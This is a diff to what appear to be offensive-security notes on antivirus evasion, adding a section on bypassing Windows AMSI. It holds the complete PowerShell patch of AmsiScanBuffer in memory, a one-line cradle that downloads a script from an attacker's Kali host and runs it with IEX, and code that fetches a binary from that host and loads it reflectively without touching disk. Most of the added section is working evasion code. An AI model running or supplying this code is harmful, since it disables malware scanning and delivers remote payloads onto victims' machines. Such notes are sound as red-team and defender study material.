@@ -66,11 +66,62 @@ pagetitle: Antivirus Evasion
 - DLL injection without touching disk
     - Share the DLL remotely with `sudo impacket-smbserver share ./`
 
+## AMSI
+- [Anti-Malware Scanning Interface](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
+- Can be bypassed using a number of tricks, but the scripts are all recognized by AMSI
+    - Techniques here: [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+    - Thus, we'll need to find the trigger and change the signature with variable renaming, function replacement, or encoding at runtime
+        - Can also use ISESteroids or [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+    - [amsi.fail](https://amsi.fail/) - Great site for generating obfuscated powershell scripts that break/disable AMSI for current process
+    - However, this won't bypass AMSI at the .net level - [https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/]https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+        - Thus, we also need the following script to bypass AMSI at the .net level (run with `(new-object system.net.webclient).downloadstring('http://{kali_ip:port}/amsi_rmouse.txt')|IEX`)
+            - This loads and executes the script directly in memory
+
+```
+# Patching amsi.dll AmsiScanBuffer by rasta-mouse
+$Win32 = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+```
+
+- We now have the ability to run anything we'd like, as long as it doesn't touch disk, which can be done like so:
+
+```
+$data=(New-Object System.Net.WebClient).DownloadData('http://{kali_IP:port}/{exe_binary}');
+$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
+$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
+[{binary_name}.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
+
 ## Thread Injection
 - Operates within the process it's being executed from
 - Rename the variables to bypass string detection
 
 ```
+
 # Import VirtualAlloc to allocate memory
 $code = '
 [DllImport("kernel32.dll")]
